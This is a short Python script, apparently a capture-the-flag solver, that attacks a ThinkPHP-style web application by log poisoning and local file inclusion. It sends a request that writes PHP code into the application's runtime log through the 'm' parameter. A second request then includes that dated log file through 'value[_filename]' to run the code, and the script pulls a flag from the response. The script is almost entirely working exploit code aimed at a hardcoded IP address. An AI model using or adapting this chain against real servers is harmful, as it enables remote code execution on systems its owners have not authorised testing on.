from datetime import datetime

from tool.base import match_flag, parse_ip_port, process
from tool.http_repeater import repeater


def run(target: tuple[str, int]):

    exp1 = f"""GET /index.php?m=--><?=phpinfo();?> HTTP/1.1
Host: {target[0]}:{target[1]}

"""
    resp = repeater(exp1)
    if not resp:
        return False, "", "GET /index.php?m=--><?=phpinfo();?> 失败"
    time_str = datetime.now().strftime("%y_%m_%d")
    exp2 = f"""GET /index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{time_str}.log HTTP/1.1
Host: {target[0]}:{target[1]}

"""
    resp = repeater(exp2)
    if not resp:
        return False, "", "GET /index.php? 失败"
    body = resp.text()
    flag = match_flag(body)
    if not flag:
        print(body)
        return False, "", "flag匹配失败"

    return True, flag, ""


def main(ip_port: str):
    def on_process(ip_port: str):
        tg = parse_ip_port(ip_port)
        if not tg.ok:
            return []
        return tg.ip_port_with()

    process(ip_port, run, on_process)


if __name__ == "__main__":
    main("192.168.192.148:32857,39515")
